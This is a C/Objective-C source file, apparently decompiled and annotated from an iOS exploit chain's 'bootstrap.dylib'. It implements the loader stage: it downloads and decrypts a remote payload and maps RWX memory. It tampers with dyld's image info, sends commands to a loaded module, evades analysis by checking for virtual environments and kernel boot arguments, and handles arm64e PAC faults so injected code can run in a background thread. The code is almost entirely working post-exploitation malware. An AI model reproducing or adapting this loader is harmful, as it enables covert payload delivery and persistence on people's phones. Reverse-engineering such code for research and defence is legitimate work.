/*
 * main.m - Entry point, thread management, payload processing
 *
 * Decompiled from bootstrap.dylib offsets 0x5fec-0x6fe8
 */

#import "bootstrap.h"
#import <string.h>
#import <stdlib.h>
#import <pthread.h>
#import <signal.h>
#import <sys/mman.h>
#import <sys/sysctl.h>
#import <mach/mach.h>
@import Darwin;
@import UIKit;

extern int sysctlbyname(const char *, void *, size_t *, void *, size_t);
extern void _exit(int);
extern int *__error(void);

/* ── process_payload (0x5fec) ──────────────────────────────────── */
/* Main payload processing function. Downloads, decrypts, and loads
 * the payload module via the bootstrap context.
 *
 * High-level flow:
 * 1. If logging enabled, report start
 * 2. Call ctx->download_func to get payload data
 * 3. Validate and decompress the data
 * 4. Parse as F00DBEEF container
 * 5. Download additional components via download_and_process
 * 6. Store container data and configure memory regions
 * 7. On flag_a/flag_new_ios: load and run module, setup mmap
 * 8. On direct mode: resolve containers, find _start, execute
 */

uint32_t process_payload(bootstrap_ctx_t *ctx, const char *url,
                         uint32_t unused, uint32_t *result)
{
    void *dl_data = NULL;
    uint32_t dl_size = 0;
    void *decrypted = NULL;
    uint32_t w23 = 0x730C4C0E; /* logging constant */

    (void)unused;

    if (!ctx)
        return 0;

    print_log("[bootstrap] process_payload: url=%s logging=%d", url, ctx->logging_enabled);

    /* Report start if logging is enabled */
    if (ctx->logging_enabled && ctx->log_func) {
        ctx->log_func(ctx, ERR_NULL_CTX + 0x1F000, NULL,
                      w23 | 0x1F0);
    }

    /* Download payload data */
    print_log("[bootstrap] process_payload: downloading payload...");
    uint32_t err = ((fn_download_t)ctx->download_func)(
        ctx, url, &dl_data, &dl_size);
    if (err) {
        print_log("[bootstrap] process_payload: download FAIL err=0x%x", err);
        if (ctx->logging_enabled && ctx->log_func)
            ctx->log_func(ctx, err, NULL, w23 + 0x1E7);
        return err;
    }
    print_log("[bootstrap] process_payload: download OK size=%u", dl_size);

    /* Validate response */
    if (!dl_data) {
        err = ERR_NULL_CTX;
        print_log("[bootstrap] process_payload: dl_data is NULL");
        if (ctx->logging_enabled && ctx->log_func)
            ctx->log_func(ctx, ERR_NULL_CTX, NULL, w23 + 0x1DF);
        goto decompress;
    }

    if (dl_size < 4) {
        err = ERR_NULL_CTX;
        print_log("[bootstrap] process_payload: dl_size too small (%u)", dl_size);
        if (ctx->logging_enabled && ctx->log_func)
            ctx->log_func(ctx, ERR_NULL_CTX, NULL, w23 + 0x1DF);
        goto decompress;
    }

    /* Decompress if needed (via ctx->key_ptr) */
    void *decompress_out = NULL;
    uint32_t decompress_size = 0;

decompress:
    if (err) {
        print_log("[bootstrap] process_payload: decompress phase err=0x%x", err);
        if (ctx->logging_enabled && ctx->log_func)
            ctx->log_func(ctx, err, NULL, w23 + 0x1CD);
        return err;
    }

    /* Report successful decompress */
    if (ctx->logging_enabled && ctx->log_func)
        ctx->log_func(ctx, 0xC0002, NULL, w23 + 0x1C9);

    /* Parse payload as container */
    print_log("[bootstrap] process_payload: parsing container...");
    fn_parse_container_t parse = ctx->fn_parse_container;
    err = parse(ctx, CONTAINER_TYPE_PAYLOAD, dl_data, dl_size);
    if (err) {
        print_log("[bootstrap] process_payload: parse_container FAIL err=0x%x", err);
        if (ctx->logging_enabled && ctx->log_func)
            ctx->log_func(ctx, err, NULL, w23 + 0x1B9);
        return err;
    }

    /* Download and process additional components */
    print_log("[bootstrap] process_payload: downloading additional components...");
    void *extra_data = NULL;
    uint32_t extra_size = 0;
    err = download_and_process(ctx, CONTAINER_TYPE_PAYLOAD,
                               &extra_data, &extra_size);
    if (err) {
        print_log("[bootstrap] process_payload: download_and_process FAIL err=0x%x", err);
        if (ctx->logging_enabled && ctx->log_func)
            ctx->log_func(ctx, err, NULL, w23 + 0x2C);
        return err;
    }

    /* Store container data pointers */
    ctx->container_data = extra_data;
    ctx->container_size = extra_size;
    print_log("[bootstrap] process_payload: container data stored size=%u", extra_size);

    /* Report successful load */
    if (ctx->logging_enabled && ctx->log_func)
        ctx->log_func(ctx, 0xC0002 | 1, NULL, w23 + 0x10);

    /* Check operational mode */
    print_log("[bootstrap] process_payload: flag_a=%d flag_new_ios=%d", ctx->flag_a, ctx->flag_new_ios);
    if (!ctx->flag_a && !ctx->flag_new_ios)
        goto direct_mode;

    /* Check if A15-specific features needed */
    if (ctx->flag_a15_features && ctx->is_sandboxed)
        goto load_module;

load_module:
    /* Set ready flag */
    ctx->flag_ready = 1;
    print_log("[bootstrap] process_payload: entering load_module path");

    /* Report ready */
    if (ctx->logging_enabled && ctx->log_func)
        ctx->log_func(ctx, 0xC0002 | 2, NULL, w23 + 0xD8);

    /* Load module via find_or_load */
    err = ((fn_find_or_load_t)ctx->fn_find_or_load)(
        ctx, CONTAINER_TYPE_MODULE);
    if (err) {
        print_log("[bootstrap] process_payload: find_or_load FAIL err=0x%x, trying get_pointer", err);
        void *module = NULL;
        err = ((fn_get_pointer_t)ctx->fn_get_pointer)(
            ctx, CONTAINER_TYPE_MODULE, &module);
        if (err) {
            print_log("[bootstrap] process_payload: get_pointer FAIL err=0x%x", err);
            if (ctx->logging_enabled && ctx->log_func)
                ctx->log_func(ctx, err, NULL, w23 + 0xD5);
            return err;
        }
    }

    print_log("[bootstrap] process_payload: load_module path OK");
    return 0;

direct_mode:
    print_log("[bootstrap] process_payload: entering direct_mode path");
    /* Direct execution mode — more complex path */
    {
        /* Get task dyld info to find executable mapping */
        mach_msg_type_number_t count = 5;
        struct {
            uint64_t all_images_addr;
            uint64_t all_images_size;
            uint8_t  _rest[0x18];
        } dyld_info;
        memset(&dyld_info, 0, sizeof(dyld_info));
        stp_zero:

        err = task_info(mach_task_self(), 17 /* TASK_DYLD_INFO */,
                        (task_info_t)&dyld_info, &count);
        if (err) {
            err |= 0x80000000;
            print_log("[bootstrap] process_payload: task_info FAIL err=0x%x", err);
            if (ctx->logging_enabled && ctx->log_func)
                ctx->log_func(ctx, err, NULL, w23 + 0xE2);
            return err;
        }

        uint64_t all_images = dyld_info.all_images_addr;
        print_log("[bootstrap] process_payload: all_images=0x%llx", all_images);
        if (!all_images) {
            err = ERR_TASK_INFO;
            print_log("[bootstrap] process_payload: all_images is NULL");
            if (ctx->logging_enabled && ctx->log_func)
                ctx->log_func(ctx, ERR_TASK_INFO, NULL, w23);
            return err;
        }

        /* Read dyld mapping info */
        uint64_t mapping = *(uint64_t *)((uint8_t *)all_images + 0x28);
        mapping &= ~1ULL; /* strip tag bit */
        print_log("[bootstrap] process_payload: mapping=0x%llx", mapping);

        if (!mapping) {
            print_log("[bootstrap] process_payload: no mapping, using load_module_wrapper");
            /* No existing mapping — use load_module_wrapper */
            void *module_handle = NULL;
            err = load_module_wrapper(ctx, &module_handle);
            if (err)
                goto check_err;

            /* Call module init */
            void *init_result = NULL;
            err = module_call_init((module_handle_t *)module_handle,
                                   0, &init_result);
            if (err)
                goto close_module;

            /* Call module command 0xD */
            print_log("[bootstrap] process_payload: calling module cmd 0xD");
            err = module_call_cmd((module_handle_t *)module_handle,
                                  init_result, 0xD, NULL);

            /* Cleanup */
            module_call_cleanup((module_handle_t *)module_handle,
                                init_result);

        close_module:
            close_module(ctx, (module_handle_t *)module_handle);

        check_err:
            if (err == ERR_NO_CONTAINER) {
                print_log("[bootstrap] process_payload: no loader container, falling back to load_module");
                goto load_module;
            }
            if (err)
                goto report_and_done;

            /* Setup mmap region */
            print_log("[bootstrap] process_payload: setting up mmap region (16MB RWX)");
            void *map = mmap(NULL, 0x1000000,
                             PROT_READ | PROT_WRITE | PROT_EXEC,
                             MAP_ANON | MAP_PRIVATE, -1, 0);
            if (map == MAP_FAILED) {
                print_log("[bootstrap] process_payload: mmap FAILED");
                if (ctx->logging_enabled && ctx->log_func)
                    ctx->log_func(ctx, ERR_MMAP_FAIL, NULL,
                                  w23 + 0x94);
                return ERR_MMAP_FAIL;
            }
            print_log("[bootstrap] process_payload: mmap OK addr=%p", map);

            ctx->atomic_state = NULL;
            ctx->exec_base = (uint8_t *)map;
            ctx->exec_size = 0x1000000;
            ctx->buffer_remaining = 0;
            memset(&ctx->mmap_base, 0, 16);

            /* Store mapping in dyld info */
            uint64_t tag = *(uint64_t *)((uint8_t *)all_images + 0x28);
            tag = (tag & 1) | (uintptr_t)map;
            *(uint64_t *)((uint8_t *)all_images + 0x28) = tag;
            goto load_module;
        }

        /* Have existing mapping — setup for container loading */
        {
            print_log("[bootstrap] process_payload: have existing mapping, loading data container");
            /* Download data container */
            void *data_dl = NULL;
            uint32_t data_sz = 0;
            fn_get_raw_data_t get_raw = ctx->fn_get_raw_data;

            err = get_raw(ctx, CONTAINER_TYPE_DATA, &data_dl, &data_sz);
            if (err) {
                print_log("[bootstrap] process_payload: get_raw_data FAIL err=0x%x", err);
                goto container_error;
            }

            /* Load module */
            void *module_handle = NULL;
            err = load_module(ctx, ERR_NULL_CTX - 0x1D000,
                              &module_handle);
            if (err) {
                print_log("[bootstrap] process_payload: load_module FAIL err=0x%x", err);
                goto container_error;
            }

            /* Call init */
            void *init_result = NULL;
            err = module_call_init((module_handle_t *)module_handle,
                                   0, &init_result);
            if (err) {
                print_log("[bootstrap] process_payload: module_call_init FAIL err=0x%x", err);
                goto container_error;
            }

            /* Setup task info */
            struct {
                uint8_t data[0x10];
            } task_data;
            memset(&task_data, 0, sizeof(task_data));
            *(uint32_t *)&task_data = mach_task_self();

            /* Send command 0x1B with task info */
            print_log("[bootstrap] process_payload: calling module cmd 0xC000001B");
            err = module_call_cmd((module_handle_t *)module_handle,
                                  init_result, 0xC000001B, &task_data);
            if (err) {
                print_log("[bootstrap] process_payload: cmd 0xC000001B FAIL err=0x%x", err);
                goto container_error;
            }

            /* Check response flags */
            if (!((uint8_t *)&task_data)[6] ||
                !((uint8_t *)&task_data)[5]) {
                ((uint8_t *)&task_data)[5] = 1;
                ((uint8_t *)&task_data)[6] = 1;
                print_log("[bootstrap] process_payload: calling module cmd 0x4000001B");
                err = module_call_cmd((module_handle_t *)module_handle,
                                      init_result, 0x4000001B, &task_data);
                if (err) {
                    print_log("[bootstrap] process_payload: cmd 0x4000001B FAIL err=0x%x", err);
                    goto container_error;
                }
            }

            /* Command 0xD */
            print_log("[bootstrap] process_payload: calling module cmd 0xD");
            err = module_call_cmd((module_handle_t *)module_handle,
                                  init_result, 0xD, NULL);
            if (err) {
                print_log("[bootstrap] process_payload: cmd 0xD FAIL err=0x%x", err);
                goto container_error;
            }

        container_error:
            if (err) {
                print_log("[bootstrap] process_payload: container_error path, trying mmap fallback");
                /* Try alternate path with vm_allocate */
                void *new_map = mmap(NULL, 0x1000000,
                                     PROT_READ | PROT_WRITE,
                                     MAP_ANON | MAP_PRIVATE, -1, 0);
                if (new_map == MAP_FAILED) {
                    err = (*(int *)__error());
                    if (err < 0) err = -err;
                    err |= 0x40000000;
                    print_log("[bootstrap] process_payload: fallback mmap FAILED err=0x%x", err);
                    goto cleanup_module;
                }
                print_log("[bootstrap] process_payload: fallback mmap OK addr=%p", new_map);

                /* Allocate VM region */
                vm_address_t vm_addr = 0;
                err = vm_allocate(mach_task_self(), &vm_addr,
                                  0x1000000, VM_FLAGS_ANYWHERE);
                if (err) {
                    print_log("[bootstrap] process_payload: vm_allocate FAIL err=0x%x", err);
                    goto vm_error;
                }
                print_log("[bootstrap] process_payload: vm_allocate OK addr=0x%lx", (unsigned long)vm_addr);

                /* Store address and copy data */
                *(uint64_t *)new_map = vm_addr;
                extern vm_size_t vm_page_size;
                memcpy((uint8_t *)new_map + vm_page_size,
                       data_dl, data_sz);

                /* Set protection to RWX */
                err = vm_protect(mach_task_self(), (vm_address_t)new_map,
                                 0x1000000, 0,
                                 VM_PROT_READ | VM_PROT_WRITE | VM_PROT_EXECUTE);
                if (err) {
                    print_log("[bootstrap] process_payload: vm_protect FAIL err=0x%x", err);
                    goto vm_error;
                }

                /* Send command 0x26 */
                print_log("[bootstrap] process_payload: calling module cmd 0x26");
                err = module_call_cmd((module_handle_t *)module_handle,
                                      init_result, 0x26, NULL);
                if (err) {
                    print_log("[bootstrap] process_payload: cmd 0x26 FAIL err=0x%x", err);
                    goto cleanup_module_with_map;
                }

                /* Update dyld mapping */
                uint64_t *slot = (uint64_t *)((uint8_t *)mapping + 0x28);
                uint64_t tag = (*slot) & 1;
                *slot = tag | (uintptr_t)new_map;
                goto cleanup_module_with_map;

            vm_error:
                err |= 0x80000000;

            cleanup_module_with_map:
                mapping = (uint64_t)(uintptr_t)new_map;
            }

        cleanup_module:
            if (module_handle) {
                if (init_result)
                    module_call_cleanup((module_handle_t *)module_handle,
                                        init_result);
                close_module(ctx, (module_handle_t *)module_handle);
            }
            if (err)
                goto report_and_done;

            /* Configure memory from mapping */
            print_log("[bootstrap] process_payload: configuring memory from mapping");
            extern vm_size_t vm_page_size;
            ctx->exec_base = (uint8_t *)((uintptr_t)decrypted +
                                          vm_page_size + 0x100000);
            ctx->exec_size = 0xF00000;
            ctx->atomic_state = (uint32_t *)((uintptr_t)decrypted +
                                              0xFFFFFC);
            ctx->mmap_base = mapping;
            ctx->mmap_secondary = (uint64_t)(uintptr_t)decrypted;
            ctx->buffer_remaining = 0;

            /* Install function pointers for alloc_buffer etc. */
            ctx->fn_alloc_buffer = (fn_alloc_buffer_t)alloc_buffer;
            ctx->consume_buf = (fn_consume_buffer_t)consume_buffer;
            ctx->bzero_func = (fn_bzero_t)secure_bzero;
            ctx->flag_direct_mem = 1;
            ctx->flag_ready = 1;
            ctx->flag_b = 1;
            print_log("[bootstrap] process_payload: direct_mode memory configured, going to load_module");
            goto load_module;
        }
    }

report_and_done:
    print_log("[bootstrap] process_payload: report_and_done err=0x%x", err);
    if (ctx->logging_enabled && ctx->log_func)
        ctx->log_func(ctx, err, NULL, w23 + 0x75);
    return err;
}

/* ── process (0x68d8) ──────────────────────────────────────────── */
/* Exported entry point. Initializes the bootstrap context:
 * 1. init_communication
 * 2. init_function_table
 * 3. init_system_info
 * 4. init_sandbox_and_ua
 * 5. Validates xnu version range
 * 6. Checks virtual environment
 * 7. Validates L2 cache / boot args
 * 8. Sets up memory regions
 * 9. Clones context, spawns worker thread
 */

__attribute__((visibility("default")))
uint32_t process(bootstrap_ctx_t *ctx)
{
    // redirect logging to file
    struct stat std_out;
    struct stat dev_null;
    if (fstat(STDOUT_FILENO, &std_out) == 0 &&
        stat("/dev/null", &dev_null) == 0 &&
        std_out.st_dev == dev_null.st_dev &&
        std_out.st_ino == dev_null.st_ino) {
        char log_path[PATH_MAX];
        snprintf(log_path, PATH_MAX, "%s/bootstrap.log", getenv("TMPDIR"));
        int log_fd = open(log_path, O_WRONLY | O_CREAT | O_APPEND, 0644);
        if (log_fd >= 0) {
            dup2(log_fd, STDOUT_FILENO);
            dup2(log_fd, STDERR_FILENO);
            close(log_fd);
        }
    }
    
    uint32_t err = ERR_GENERIC;

    if (!ctx)
        return err - 8;

    /* Sign raw function pointers from exploit chain for arm64e PAC */
    sign_ctx_fptrs(ctx);

    print_log("[bootstrap] process: entry ctx=%p", ctx);

    /* Step 1: Initialize communication (logging, semaphore) */
    print_log("[bootstrap] process: step 1 - init_communication");
    err = init_communication(ctx);
    if (err) {
        print_log("[bootstrap] process: init_communication FAIL err=0x%x", err);
        return err;
    }

    /* Step 2: Initialize function table (container management) */
    print_log("[bootstrap] process: step 2 - init_function_table");
    err = init_function_table(ctx);
    if (err) {
        print_log("[bootstrap] process: init_function_table FAIL err=0x%x", err);
        return err;
    }

    /* Step 3: Initialize system info (OS version, device type, etc.) */
    print_log("[bootstrap] process: step 3 - init_system_info");
    err = init_system_info(ctx);
    if (err) {
        print_log("[bootstrap] process: init_system_info FAIL err=0x%x", err);
        return err;
    }

    /* Step 4: Initialize sandbox detection and user-agent */
    print_log("[bootstrap] process: step 4 - init_sandbox_and_ua");
    err = init_sandbox_and_ua(ctx);
    if (err) {
        print_log("[bootstrap] process: init_sandbox_and_ua FAIL err=0x%x", err);
        return err;
    }

    /* Validate xnu version is within expected range */
    uint64_t xnu = ctx->xnu_version;
    print_log("[bootstrap] process: xnu_version=0x%llx os_version=0x%x", xnu, ctx->os_version);
    uint64_t adjusted = xnu + 0xFFE7F6FFF9900000ULL;
    err = ERR_GENERIC - 1;
    if (adjusted > 0x000F090EFE400003ULL) {
        print_log("[bootstrap] process: xnu version out of range");
        return err;
    }

    /* If device is sandboxed, check additional constraints */
    if (ctx->is_sandboxed) {
        print_log("[bootstrap] process: sandboxed, checking constraints");
        uint32_t os_ver = ctx->os_version;
        err = 0x27009;
        if (os_ver < 0x100000) {
            print_log("[bootstrap] process: os_version too low (0x%x)", os_ver);
            return err;
        }

        /* Check CPU type for known SoC families */
        if (os_ver > 0x100401) {
            uint32_t cpu = ctx->cpu_type;
            print_log("[bootstrap] process: checking cpu_type=0x%x", cpu);
            if (cpu == SOC_TYPE_A)
                goto env_check;
            if (cpu == SOC_TYPE_B)
                goto env_check;
            if (cpu > (int32_t)SOC_TYPE_C) {
                if (cpu == SOC_TYPE_E)
                    goto env_check;
                if (cpu == SOC_TYPE_D)
                    goto env_check;
            }
        }
    }

env_check:
    /* Check for virtual environment (Corellium, etc.) */
    print_log("[bootstrap] process: checking virtual environment");
    {
        uint8_t is_virtual = 1;
        err = check_virtual_env(&is_virtual);
        uint32_t env_err = (is_virtual == 0) ? (ERR_GENERIC + 0x1B) : 0;
        if (err)
            env_err = ERR_GENERIC + 2;
        err = env_err;
        if (err) {
            print_log("[bootstrap] process: virtual env check FAIL err=0x%x is_virtual=%d", err, is_virtual);
            //return err;
        }
    }
    print_log("[bootstrap] process: virtual env check OK");

    /* Validate os_version ceiling */
    if (ctx->os_version > 0x1102FF) {
        print_log("[bootstrap] process: os_version too high (0x%x)", ctx->os_version);
        return ERR_GENERIC - 1;
    }

    /* Check L2 cache size for additional validation */
    if (ctx->os_version >= 0xE0000) {
        uint64_t l2_size = 0;
        size_t l2_len = 8;
        int sysret = sysctlbyname("hw.l2cachesize", &l2_size, &l2_len,
                                   NULL, 0);
        print_log("[bootstrap] process: l2cachesize=%llu sysret=%d", l2_size, sysret);
        uint32_t l2_err = (l2_size >> 20) ? 0 : (ERR_GENERIC + 0x1B);
        if (!sysret && l2_size >= 0x100000)
            goto check_bootargs;
        err = l2_err;
    }

check_bootargs:
    /* Check kernel boot arguments for debug strings */
    print_log("[bootstrap] process: checking bootargs");
    {
        char bootargs[0x400];
        size_t ba_len = 0x400;
        memset(bootargs, 0, sizeof(bootargs));
        if (sysctlbyname("kern.bootargs", bootargs, &ba_len, NULL, 0) == 0
            && bootargs[0]) {
            print_log("[bootstrap] process: bootargs='%s'", bootargs);
            if (bootargs[0] != ' ' || bootargs[1] != '\0') {
                print_log("[bootstrap] process: bootargs check FAIL");
                return ERR_GENERIC + 0x1B;
            }
        }
    }

    /* Check host info for iOS 15 and below */
    if (ctx->os_version <= 0xF0000) {
        mach_msg_type_number_t hi_count = 1;
        uint32_t hi_data = 0;
        int hi_ret = host_info(mach_host_self(), 11 /* HOST_VM_INFO */,
                               (host_info_t)&hi_data, &hi_count);
        print_log("[bootstrap] process: host_info ret=%d data=0x%x", hi_ret, hi_data);
        uint32_t hi_err = (hi_data == 0) ? 0 : (ERR_GENERIC + 0x1B);
        if (hi_ret)
            goto setup_mem;
        err = hi_err;
        if (err) {
            print_log("[bootstrap] process: host_info check FAIL err=0x%x", err);
            return err;
        }
    }

setup_mem:
    /* Setup memory regions */
    print_log("[bootstrap] process: step 5 - setup_memory");
    err = setup_memory(ctx);
    if (err) {
        print_log("[bootstrap] process: setup_memory FAIL err=0x%x", err);
        return err;
    }

    /* Clone context for worker thread */
    print_log("[bootstrap] process: cloning context for worker thread");
    bootstrap_ctx_t *clone = (bootstrap_ctx_t *)malloc(sizeof(bootstrap_ctx_t));
    if (!clone)
        goto fail;

    memcpy(clone, ctx, sizeof(bootstrap_ctx_t));

    /* Duplicate heap-allocated strings */
    if (clone->secondary_url) {
        clone->secondary_url = strdup(clone->secondary_url);
        if (!clone->secondary_url)
            goto fail;
    }

    if (clone->key_ptr) {
        uint8_t *new_key = (uint8_t *)malloc(0x20);
        if (!new_key)
            goto fail;
        memcpy(new_key, clone->key_ptr, 0x20);
        clone->key_ptr = new_key;
    }

    if (clone->base_url) {
        clone->base_url = strdup(clone->base_url);
        if (!clone->base_url)
            goto fail;
    }

    if (clone->user_agent) {
        clone->user_agent = strdup(clone->user_agent);
        if (!clone->user_agent)
            goto fail;
    }

    if (clone->alt_url) {
        clone->alt_url = strdup(clone->alt_url);
        if (!clone->alt_url)
            goto fail;
    }

    /* Create worker thread */
    print_log("[bootstrap] process: creating worker thread");
    {
        uint32_t thread_err = ERR_NULL_CTX + 0x10000;
        pthread_attr_t attr;
        if (pthread_attr_init(&attr))
            goto fail;

        if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED)) {
            pthread_attr_destroy(&attr);
            goto fail;
        }

        pthread_t thread;
        if (pthread_create(&thread, &attr, (void *(*)(void *))thread_main, clone) == 0) {
            thread_err = 1; /* success sentinel */
            print_log("[bootstrap] process: worker thread created OK");
        } else {
            thread_err++;
            print_log("[bootstrap] process: pthread_create FAILED");
        }

        pthread_attr_destroy(&attr);
        return thread_err;
    }

fail:
    print_log("[bootstrap] process: FAIL (alloc error)");
    return ERR_NULL_CTX + 0x10000;
}

/* ── thread_main (0x6c44) ──────────────────────────────────────── */
/* Worker thread entry point. Sets up SIGSEGV handler for PAC faults,
 * creates a UIApplication background task, calls process_payload,
 * then cleans up.
 */

void *thread_main(bootstrap_ctx_t *ctx)
{
    uint32_t err = ERR_GENERIC;
    uint32_t result = err - 9; /* = ERR_NULL_CTX */
    int sig_installed = 0;

    print_log("[bootstrap] thread_main: entry ctx=%p", ctx);

    /* Install PAC SIGSEGV handler on iOS 13-14 arm64e only.
     * On iOS 15+, the exploit uses a different PAC bypass strategy
     * and does NOT need the SIGSEGV fault handler. */
    uint16_t os_major = (ctx->os_version >> 16) & 0xFF;
    print_log("[bootstrap] thread_main: os_major=%u has_pac=%d", os_major, has_pac());
    if (os_major <= 14 && has_pac()) {
        /* Install SIGSEGV handler for PAC faults */
        print_log("[bootstrap] thread_main: installing PAC SIGSEGV handler");
        struct sigaction sa, old_sa;
        memset(&sa, 0, sizeof(sa));
        sa.sa_sigaction = (void (*)(int, siginfo_t *, void *))resolve_pac_pointer;
        sa.sa_flags = SA_SIGINFO;

        if (sigaction(SIGSEGV, &sa, &old_sa) != 0) {
            err = *__error();
            if (err < 0) err = (uint32_t)(-err);
            err |= 0x40000000;
            print_log("[bootstrap] thread_main: sigaction FAIL err=0x%x", err);
            return (void *)(uintptr_t)err;
        }
        sig_installed = 1;
        print_log("[bootstrap] thread_main: SIGSEGV handler installed");
    }

    /* Begin UIApplication background task */
    UIBackgroundTaskIdentifier bg_task = UIBackgroundTaskInvalid;

    UIApplication *app = [UIApplication alloc];
    print_log("[bootstrap] thread_main: UIApplication=%p", app);
    if (!app) {
        print_log("[bootstrap] thread_main: cleanup err=0x%x", err);
        return (void *)(uintptr_t)err;
    }

    id expireBlock = ^{
        print_log("[bootstrap] bg_task_expired: ending task_id=%lu", (unsigned long)bg_task);
        [app endBackgroundTask:bg_task];
        //bg_task = UIBackgroundTaskInvalid;
    };
//    uint64_t underlyingClass = *(uint64_t*)expireBlock;
//    __asm__ volatile("pacda %0, %1" : "+r"(underlyingClass) : "r"((uint64_t)expireBlock | (0x6ae1ll << 48)));
//    *(uint64_t*)expireBlock = underlyingClass;
    
    bg_task = [app beginBackgroundTaskWithExpirationHandler:expireBlock];
    print_log("[bootstrap] thread_main: background task started id=%lu", (unsigned long)bg_task);

    /* Process the payload */
    char *url = ctx->secondary_url;
    print_log("[bootstrap] thread_main: secondary_url=%s", url ? url : "(null)");
    if (url) {
        err = process_payload(ctx, url, 0, &result);
        print_log("[bootstrap] thread_main: process_payload returned err=0x%x result=0x%x", err, result);
        if (err == 0)
            err = result;
    } else {
        err = 0;
    }

    /* End background task if it was started */
    if (bg_task != UIBackgroundTaskInvalid) {
        print_log("[bootstrap] thread_main: ending background task");
        [app endBackgroundTask:bg_task];
        bg_task = UIBackgroundTaskInvalid;
    }

    /* Restore SIGSEGV handler if we installed one */
    if (sig_installed) {
        print_log("[bootstrap] thread_main: restoring SIGSEGV handler");
        struct sigaction old_sa;
        if (sigaction(SIGSEGV, NULL, &old_sa) != 0) {
            err = *__error();
            if (err < 0) err = (uint32_t)(-err);
            err |= 0x40000000;
            print_log("[bootstrap] thread_main: sigaction restore FAIL err=0x%x", err);
        }
    }

    /* Check if exit requested */
    if (ctx->flag_exit) {
        print_log("[bootstrap] thread_main: flag_exit set, calling _exit(0)");
        _exit(0);
    }

cleanup:
    print_log("[bootstrap] thread_main: cleanup err=0x%x", err);
    return (void *)(uintptr_t)err;

done:
    print_log("[bootstrap] thread_main: done err=0x%x", err);
    return (void *)(uintptr_t)err;
}
